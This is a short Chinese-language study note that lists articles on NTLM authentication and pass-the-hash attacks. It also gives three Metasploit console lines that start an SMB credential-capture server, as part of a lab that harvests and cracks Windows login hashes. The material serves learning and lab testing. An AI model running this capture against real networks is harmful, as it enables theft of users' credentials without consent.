## NTLM 以及 PtH 攻击的介绍

[The NTLM Authentication Protocol and Security Support Provider](http://davenport.sourceforge.net/ntlm.html)

[Pass-the-Hash in Windows 10 -- SANS Institute](https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-windows-10-39170) 非常好的文章，写作严谨，总结全面。（NTLM 过程解释非常清晰！）

[NTLM 基础介绍](https://www.anquanke.com/post/id/193149)

[发起NTLM请求](https://www.anquanke.com/post/id/193493)

[Net-NTLM利用](https://www.anquanke.com/post/id/194069)

[漏洞概述](https://www.anquanke.com/post/id/194514)

## 攻击实验

[[原创]实验：SMB抓包破解windows登陆密码 ](https://bbs.pediy.com/thread-176189-1.htm) 

Windows要使用当前登陆用户的user/psw进行认证，使用的是SMB协议。

```shell
$ sudo msfconsole
msf> use auxiliary/server/capture/smb
msf> run
```

**Windows 默认自动使用当前登录用户进行验证**

